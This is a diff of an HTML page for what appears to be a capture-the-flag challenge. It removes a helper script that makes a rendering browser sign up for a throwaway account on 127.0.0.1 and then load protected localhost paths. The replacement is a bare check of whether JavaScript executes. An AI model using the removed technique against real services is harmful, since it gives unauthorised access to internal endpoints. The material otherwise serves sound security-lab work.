@@ -1,96 +1,15 @@
 <!doctype html>
-<html lang="en">
+<html>
 <head>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="robots" content="noindex, nofollow, noarchive">
-  <title>CTF Helper</title>
-  <style>
-    body {
-      font-family: system-ui, sans-serif;
-      max-width: 760px;
-      margin: 3rem auto;
-      padding: 0 1rem;
-      line-height: 1.5;
-    }
-    code, pre {
-      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
-    }
-    #status {
-      padding: 1rem;
-      border: 1px solid #999;
-      border-radius: 8px;
-      white-space: pre-wrap;
-    }
-  </style>
+  <meta name="robots" content="noindex,nofollow">
+  <title>JS test</title>
 </head>
 <body>
-  <h1>CTF helper</h1>
-  <p>This page creates a throwaway localhost account in a new browsing context, then navigates the main page to a protected localhost URL.</p>
-  <div id="status">Starting…</div>
 
-  <form id="signup"
-        method="POST"
-        action="http://127.0.0.1/signup"
-        target="authwindow"
-        style="display:none">
-    <input type="hidden" name="username" id="username">
-    <input type="hidden" name="password" id="password">
-  </form>
+<h1 id="result">JavaScript did NOT execute</h1>
 
-  <script>
-    (() => {
-      /*
-       * PageSpeed Outsides CTF helper.
-       *
-       * Expected flow:
-       *  1. Chromium loads this page.
-       *  2. A new top-level browsing context is opened.
-       *  3. POST http://127.0.0.1/signup creates a throwaway account.
-       *  4. The localhost app sets connect.sid for 127.0.0.1.
-       *  5. This page navigates to a protected localhost resource.
-       *
-       * Change TARGET_PATH below for whatever endpoint you want to inspect.
-       */
+<script src="./helper.js"></script>
 
-      const TARGET_PATH = "/dashboard";
-      // After confirming /dashboard works, try for example:
-      // const TARGET_PATH = "/api/reports/search?id=15208";
-
-      const SIGNUP_DELAY_MS = 4500;
-
-      const suffix = `${Date.now()}_${Math.floor(Math.random() * 100000)}`;
-      const username = `ctf_probe_${suffix}`;
-      const password = `Temp_${suffix}_Aa1!`;
-
-      const status = document.getElementById("status");
-      const log = (message) => {
-        status.textContent += `\n${message}`;
-      };
-
-      document.getElementById("username").value = username;
-      document.getElementById("password").value = password;
-
-      log(`Generated throwaway account: ${username}`);
-      log("Opening localhost authentication window…");
-
-      const authWindow = window.open("about:blank", "authwindow");
-
-      if (!authWindow) {
-        log("Popup was blocked. The signup form will still be submitted, but this technique may fail.");
-      } else {
-        log("Authentication window opened.");
-      }
-
-      log("Submitting POST to http://127.0.0.1/signup …");
-      document.getElementById("signup").submit();
-
-      setTimeout(() => {
-        const target = `http://127.0.0.1${TARGET_PATH}`;
-        log(`Navigating main page to ${target}`);
-        window.location.href = target;
-      }, SIGNUP_DELAY_MS);
-    })();
-  </script>
 </body>
 </html>
